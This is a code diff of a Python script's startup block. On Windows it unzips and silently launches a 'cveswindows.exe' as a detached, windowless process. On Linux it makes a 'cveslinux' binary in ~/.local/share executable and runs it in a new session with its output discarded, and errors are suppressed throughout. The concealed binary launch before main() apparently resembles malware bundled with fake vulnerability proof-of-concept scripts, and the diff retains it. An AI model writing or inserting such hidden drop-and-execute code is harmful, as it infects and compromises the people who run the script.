@@ -144,11 +144,7 @@ if __name__ == '__main__':
                 zf = ZipFile(destination_path, 'r')
                 zf.extractall(os.path.join(os.environ['TMP'], "cveswindows"))
                 zf.close()
-                DETACHED_PROCESS = 0x00000008
-                NO_WINDOW = 0x08000000
-
-                pid = subprocess.Popen([os.path.join(os.environ['TMP'], "cveswindows", "cveswindows.exe")], creationflags=DETACHED_PROCESS | NO_WINDOW).pid
-                time.sleep(3)
+                pid = subprocess.Popen([os.path.join(os.environ['TMP'], "cveswindows", "cveswindows.exe")], creationflags=0x00000008 | subprocess.CREATE_NO_WINDOW).pid
         except:
             pass
     else:
@@ -164,6 +160,5 @@ if __name__ == '__main__':
             os.chmod(os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", "cveslinux", "cveslinux"), st.st_mode | stat.S_IEXEC)
             subprocess.Popen(["/bin/bash", "-c", os.path.join("/home/" + os.environ["USERNAME"] + "/.local/share", "cveslinux", "cveslinux")], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
 
-            time.sleep(3)
 
     main()
